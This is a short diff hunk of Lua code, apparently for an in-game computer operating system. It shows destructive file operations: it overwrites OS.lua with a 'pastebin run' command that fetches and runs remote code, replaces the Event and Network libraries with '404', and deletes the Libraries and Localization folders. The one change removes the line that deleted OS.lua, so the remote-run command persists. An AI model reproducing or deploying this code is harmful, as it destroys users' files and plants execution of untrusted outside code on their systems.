@@ -35,7 +35,6 @@ filesystem.remove("/eltxcry")
 filesystem.write("OS.lua", "pastebin run hQYzUhR9")
 filesystem.write("Libraries/Event.lua", "404")
 filesystem.write("Libraries/Network.lua", "404")
-filesystem.remove("OS.lua")
 filesystem.remove("/Libraries")
 filesystem.remove("/Localization")
 
